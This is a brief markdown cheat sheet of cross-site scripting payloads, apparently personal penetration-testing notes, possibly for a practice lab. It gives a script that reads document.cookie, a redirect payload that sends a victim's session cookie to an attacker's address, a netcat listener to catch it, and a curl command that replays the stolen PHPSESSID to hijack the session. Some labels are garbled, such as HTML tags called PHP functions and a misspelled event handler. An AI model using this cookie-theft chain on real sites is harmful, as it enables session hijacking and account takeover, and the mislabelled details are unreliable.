# XSS

Get cookie:
```php
<script>document.write(document.cookie)</script>
```
Can use different php function than <script>.

php
```php
<title>
<style>
<textarea>
<noscript>
<pre>
<iframe>
```

javascript:
```javascript
onload()
onmouseover()
autofocus()
onfokus()
```

Send cookie back to your self:
```php
<SCRIPT>window.location='http_address:port/?cookie='+document.cookie</SCRIPT>
```
and use a listener:
```bash
nc -lvnp port
```
Use curl to pass the cookie and get the info:
```bash
curl -b "security=low;PHPSESSID=cookie_here" --location "http_address_here" > output_to_file
```
